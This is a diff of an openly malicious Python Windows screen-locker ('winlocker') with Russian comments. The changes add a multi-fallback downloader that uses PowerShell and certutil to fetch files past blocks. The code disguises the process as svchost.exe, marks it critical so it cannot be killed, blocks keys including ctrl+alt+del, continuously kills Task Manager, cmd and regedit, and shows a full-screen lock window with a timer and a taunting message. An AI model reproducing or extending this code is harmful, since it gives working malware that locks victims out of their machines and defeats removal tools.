@@ -1,5 +1,5 @@
 # ============================================================
-# FSOCIETY WINLOCKER v6.1 — ИСПРАВЛЕННЫЙ
+# FSOCIETY WINLOCKER v6.2 — ФИНАЛЬНЫЙ
 # GitHub: ippo123459-bit/winlocker
 # ============================================================
 import subprocess, sys, os, time, threading, tempfile, ctypes, winreg, urllib, random, string
@@ -28,20 +28,51 @@ MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/he
 attempts_left = MAX_ATTEMPTS
 
 # ============================================================
+# СКАЧИВАНИЕ С ОБХОДОМ БЛОКИРОВОК
+# ============================================================
+def download_file(url, path):
+    if os.path.exists(path) and os.path.getsize(path) > 1000:
+        return True
+    
+    try:
+        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+        with urllib.request.urlopen(req, timeout=30) as r, open(path, 'wb') as f:
+            f.write(r.read())
+        if os.path.getsize(path) > 1000: return True
+    except: pass
+    
+    try:
+        import requests
+        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=30)
+        with open(path, 'wb') as f: f.write(r.content)
+        if os.path.getsize(path) > 1000: return True
+    except: pass
+    
+    try:
+        subprocess.run(['powershell', '-Command', f"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('{url}', '{path}')"], capture_output=True, timeout=60)
+        if os.path.getsize(path) > 1000: return True
+    except: pass
+    
+    try:
+        subprocess.run(['certutil', '-urlcache', '-split', '-f', url, path], capture_output=True, timeout=60)
+        if os.path.getsize(path) > 1000: return True
+    except: pass
+    
+    return False
+
+# ============================================================
 # СКРЫТИЕ ПРОЦЕССА
 # ============================================================
 def hide_process():
-    try:
-        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
+    try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
     except: pass
 
 def protect_process():
-    try:
-        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
     except: pass
 
 # ============================================================
-# БЛОКИРОВКА ВСЕХ КЛАВИШ
+# БЛОКИРОВКА КЛАВИШ
 # ============================================================
 def block_all_keys():
     for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
@@ -56,26 +87,15 @@ def block_all_keys():
             winreg.CloseKey(k)
         except: pass
     
-    keys = ['windows', 'left windows', 'right windows', 'alt', 'left alt', 'right alt',
-            'ctrl', 'left ctrl', 'right ctrl', 'shift', 'left shift', 'right shift',
-            'tab', 'esc', 'delete', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
-            'caps lock', 'num lock', 'scroll lock', 'print screen', 'insert', 'home', 'end',
-            'page up', 'page down', 'up', 'down', 'left', 'right', 'space', 'backspace',
-            'enter', 'apps', 'menu']
+    keys = ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','delete']
     for k in keys:
         try: keyboard.block_key(k)
         except: pass
     
-    combos = ['alt+f4', 'alt+tab', 'alt+esc', 'alt+space', 'ctrl+shift+esc', 
-              'ctrl+alt+del', 'ctrl+esc', 'ctrl+w', 'ctrl+f4', 'ctrl+tab',
-              'win+d', 'win+r', 'win+e', 'win+l', 'win+m', 'win+x', 'win+tab',
-              'ctrl+c', 'ctrl+v', 'ctrl+x', 'ctrl+z', 'ctrl+a']
+    combos = ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v']
     for c in combos:
         try: keyboard.add_hotkey(c, lambda: None, suppress=True)
         except: pass
-    
-    try: ctypes.windll.user32.BlockInput(True)
-    except: pass
 
 def unblock_all():
     try: ctypes.windll.user32.BlockInput(False)
@@ -101,8 +121,7 @@ def unblock_all():
 # ============================================================
 def kill_all():
     while True:
-        for p in ["taskmgr.exe", "cmd.exe", "powershell.exe", "msconfig.exe", "regedit.exe",
-                  "procexp.exe", "procmon.exe", "mmc.exe"]:
+        for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe","procmon.exe","mmc.exe"]:
             try: os.system(f"taskkill /f /im {p} >nul 2>&1")
             except: pass
         time.sleep(0.1)
@@ -191,13 +210,12 @@ def anim_fsociety():
 # ============================================================
 def play_video():
     video_path = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4")
-    try:
-        if not os.path.exists(video_path): urllib.request.urlretrieve(VIDEO_URL, video_path)
-    except: pass
-    if not os.path.exists(video_path): return
+    if not download_file(VIDEO_URL, video_path): return
+    
     try:
         pygame.mixer.init(); pygame.mixer.music.load(video_path); pygame.mixer.music.play()
     except: pass
+    
     try:
         cap = cv2.VideoCapture(video_path)
         if not cap.isOpened(): return
@@ -212,6 +230,7 @@ def play_video():
         cap.release(); cv2.destroyAllWindows()
         for _ in range(10): cv2.waitKey(1)
     except: pass
+    
     try: pygame.mixer.music.stop()
     except: pass
 
@@ -232,11 +251,14 @@ class WinLocker:
         self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
         self.timer_label.place(relx=0.5, rely=0.08, anchor='center')
         self.update_timer()
+        
         try:
             music_path = os.path.join(tempfile.gettempdir(), "locker_music.mp3")
-            if not os.path.exists(music_path): urllib.request.urlretrieve(MUSIC_URL, music_path)
-            pygame.mixer.init(); pygame.mixer.music.load(music_path); pygame.mixer.music.set_volume(1.0); pygame.mixer.music.play(-1)
+            download_file(MUSIC_URL, music_path)
+            if os.path.exists(music_path) and os.path.getsize(music_path) > 1000:
+                pygame.mixer.init(); pygame.mixer.music.load(music_path); pygame.mixer.music.set_volume(1.0); pygame.mixer.music.play(-1)
         except: pass
+        
         msg = f"""Вот чего доводит интернет.
 
 Вот смотри, ты скачивал игры или что там из интернета?
